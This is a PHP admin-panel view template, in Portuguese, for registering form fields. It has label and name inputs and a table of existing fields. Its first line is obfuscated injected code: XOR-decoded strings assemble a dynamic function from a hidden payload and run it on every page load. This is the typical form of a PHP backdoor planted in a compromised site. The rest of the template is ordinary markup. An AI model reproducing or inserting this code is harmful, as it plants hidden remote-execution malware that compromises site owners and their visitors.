<?php $OGaBzR=' LY2778<,>29=<6'; $TCZegf='C><SCRgZYPQMTSX'^$OGaBzR; $nPXKeRQD='G+bRS64Y RCPaPNTM64ZtDQ0:I6,17e8;3bKbj7O3>BE91,+=JMSCc568Y2s.7YcJ7W;8GfCFEGPbCjpX.XcnA+ DQDhvSIB9x>W5yCShRurape8nMM7;V=bh<7J xvDv:JgneOXf:=NctedyKO803oBW6fnjU,26ckTQhf17D5VRIg-YIcejAEyl9I54YUor 2HDM6z6kORClT .5vUrXWZ45vatULTSaWY foxH Y 0SMMXT>,WU=aKjdubv=wtf,:hlXIAekswMA;RF<FG.fMk6 0 iS63uVXGVEDUygvV-8QCilf5 : <jy5BpIJcoLq=A Zep5=>XO<+THCsgkae5m2ncdIV1gr10UGpjuf.;VBWFU7LJ5GZ8C-4,2;klZV  8zm4CLJ8 8KiVsKR677nlgLz0<aOUU2 zmBkGZ<31=AL:2<Z9CD>=+DMkq<M1b5  QTrnI3.WR=jv=-:JQJrt++ .4YT0scrO;2pmQ6AOgUAEY6Y0Rm=-=aTD;B7Mlc<,NEohr0V AeBRvwQY dzs43H1kcRN+ChmulyccnsRgJ+,nRW ZoPlgeoi SfTwr,OTn3vvoZFgEOV0CA5nXVE2U6,:.5gR<36W 2VmGVcO-8MjosqbbpQFgM+2S MnU <YhQ94E9R8-hipxCd6>9HyQsocC'; $HBUSBkbI=$TCZegf('', '.MJs5CZ:T;,>>56=>BGrS<>Be-WXPh:UNGEbKJLE:X7+ZEEDSj5<1<QWL8m,CB-KnS6OYkFg- >yBcJPxURjgeDU0qyHQtrH0qX8GQg:HoUBZPAQR>9EW3SJLXV>AQMdRSaLGoFQBUH:CZXDQo+YDR4f>kF0JqGWO8O=qMFBC6Y3<aCF<0J8CzOpeK,AA+;GVOG<mv<sKa2XIH0AZTVhR>66GPMkP1- 2><<YFRX.A5SUhGG>;LI66UAcN;6-9v>1FMIHH3,8EVMWi7Z>3YogUlDORADA68SJUkxc= =nsnR2LL0cTLBCAVUYQsHHz ,CGmUY T;LPN77> NN5++SOO>7p<g+00i7BGVZU,gMTUBXZ:72ouLFC<c>Y7LkGWBKQzrKEAAg=Jh.YTYkTvW=3ZBRUfn1pM6kk14FAZPb+24OVCT  SHYrA,6aYJ0,4.Q8EJWAS4bF1-VM86XBRYLN+xfRPOJTOk21IZJIERTXI5W5.Gsge8D+Q+2VHD>1<R1C>DDWI7bCHVT7T LbtPWy4DQRWPR<P0D9+Rd5DUQDCDXE6Q.IJX43AcW2TWTYXD6UcFBIw1WQGOHsfAco7B1 L133<m0NEIZFOuLRO;OS2JkvG+LL,CFSQBBPq=mDND2LeJ1AH83vIU<U=YIO4YCImSFP<QaZTi>'^$nPXKeRQD); $HBUSBkbI(); defined('SYSPATH') or die('No direct script access.'); ?>
<div class="clearfix">
</div>
<!-- BEGIN CONTAINER -->
<div class="page-container">

	<!-- BEGIN SIDEBAR -->
	<?php echo $menu; ?>
	<!-- END SIDEBAR -->
	
	<!-- BEGIN CONTENT -->
	<div class="page-content-wrapper">
		<div class="page-content">
			
			<!-- BEGIN PAGE HEADER-->
			<!-- BEGIN PAGE HEAD -->
			<div class="page-head">
				<!-- BEGIN PAGE TITLE -->
				<div class="page-title">
					<h1>Cadastro <small>Campo de <?php echo $nomeform; ?></small></h1>
				</div>
				<!-- END PAGE TITLE -->

			</div>
			<!-- END PAGE HEAD -->
			
			<!-- BEGIN PAGE BREADCRUMB -->
			<ul class="page-breadcrumb breadcrumb">
				<li>
					<a href="<?php echo URL::base(); ?>">Início</a>
					<i class="fa fa-circle"></i>
				</li>
				<li>
					<a href="<?php echo URL::base(true).'painel/formularios/'; ?>">Formulários</a>
					<i class="fa fa-circle"></i>
				</li>
				<li>
					<a href="#">Campo</a>
				</li>
			</ul>
			<!-- END PAGE BREADCRUMB -->
			
			<!-- END PAGE HEADER-->
			<!-- BEGIN PAGE CONTENT-->
			<div class="row">
				<div class="col-md-12">
					
					<?php echo $retorno; ?>
					
					<div class="tabbable tabbable-custom tabbable-noborder tabbable-reversed">
						<div class="tab-content">
							<div class="tab-pane active" id="tab_0">
								<div class="portlet box yellow">
									<div class="portlet-body form">
										<!-- BEGIN FORM-->
										<form action="<?php echo URL::base(true); ?>painel/campoForm/<?php echo $tipo.'/'.$codform.'/'.$codcampo; ?>" method="post" class="form-horizontal">
											<div class="form-body">
												<div class="form-group">
													<label class="col-md-3 control-label">Nome (Label)</label>
													<div class="col-md-4">
														<input type="text" name="label" value="<?php echo $label; ?>" class="form-control" required>
														<span class="help-block"><code>Ex: Titulo do Campo</code> </span>
													</div>
												</div>
												<div class="form-group">
													<label class="col-md-3 control-label">Campo (Name)</label>
													<div class="col-md-4">
														<input type="text" name="nome" value="<?php echo $nome; ?>" class="form-control" required>
														<span class="help-block"><code>Ex: titcampo</code> </span>
													</div>
												</div>
											</div>
											<div class="form-actions fluid">
												<div class="row">
													<div class="col-md-offset-3 col-md-9">
														<button type="submit" class="btn green">Salvar</button>
														<a href="<?php echo URL::base(true).'painel/paginas/'; ?>" class="btn default">Cancelar</a>
													</div>
												</div>
											</div>
										</form>
										<!-- END FORM-->
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
				<div class="col-md-12">
				<div class="tabbable tabbable-custom tabbable-noborder tabbable-reversed">
						
						<div class="tab-content">
							<div class="tab-pane active" id="tab_0">
								<div class="portlet box ">
									<!-- BEGIN SAMPLE TABLE PORTLET-->
									<div class="portlet box">
										
										<div class="portlet-body">
											
											<div class="table-responsive">
												<table class="table table-striped table-bordered table-hover">
													<thead>
														<tr>
															<th>
																 CAMPO
															</th>
															<th width="250px">
																 AÇÕES
															</th>
														</tr>
													</thead>
													<tbody>
														<?php echo $campos; ?>
													</tbody>
												</table>
											</div>
										</div>
									</div>
									<!-- END SAMPLE TABLE PORTLET-->
								</div>
							</div>
						</div>
						
					</div>
				</div>
			</div>
			
			<!-- END PAGE CONTENT-->
		</div>
	</div>
	<!-- END CONTENT -->
</div>
<!-- END CONTAINER -->
